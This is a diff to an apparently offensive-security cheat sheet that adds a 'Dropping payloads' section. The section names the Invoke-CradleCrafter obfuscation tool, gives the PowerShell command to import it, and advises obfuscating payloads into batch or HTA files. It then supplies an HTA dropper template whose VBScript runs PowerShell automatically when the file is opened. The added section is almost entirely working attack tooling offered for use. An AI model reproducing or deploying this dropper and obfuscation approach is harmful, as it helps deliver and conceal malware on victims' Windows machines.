@@ -148,6 +148,25 @@ set LPORT <port>
 
 Settings for the handlers must match those of the payload.
 
+# Dropping payloads
+## Invoke-CradleCrafter
+[https://github.com/danielbohannon/Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)
+
+PS > Import-Module Invoke-CradleCrafter.ps1 && import-module Out-Cradle.ps1
+
+Obfuscate all the things, drop into batch/hta/whatever.
+
+## HTA file dropper
+``` html
+<script language="VBScript"> 
+    Sub a
+        Set z = CreateObject("Wscript.Shell")
+        command = "%systemroot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -noexit whatever"
+        z.Run command
+    End Sub
+</script> 
+<body onload="a">
+```
 # Post-exploitation
 
 ## Windows
